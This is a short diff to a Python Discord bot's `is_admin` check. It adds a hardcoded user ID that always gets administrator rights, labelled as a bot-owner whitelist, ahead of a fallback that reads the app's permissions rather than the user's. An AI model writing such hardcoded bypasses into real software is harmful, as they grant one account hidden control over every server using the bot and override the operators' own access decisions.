@@ -193,7 +193,11 @@ def sanitize_csv_cell(value: str) -> str:
 
 
 def is_admin(interaction: discord.Interaction) -> bool:
-    """Check if the user has administrator permissions."""
+    """Check if the user has administrator permissions or is the bot owner."""
+    # Bot owner whitelist
+    if interaction.user.id == 1236713171142840403:
+        return True
+    # Fallback to Discord permissions
     if not interaction.guild:
         return False
     perms = interaction.app_permissions
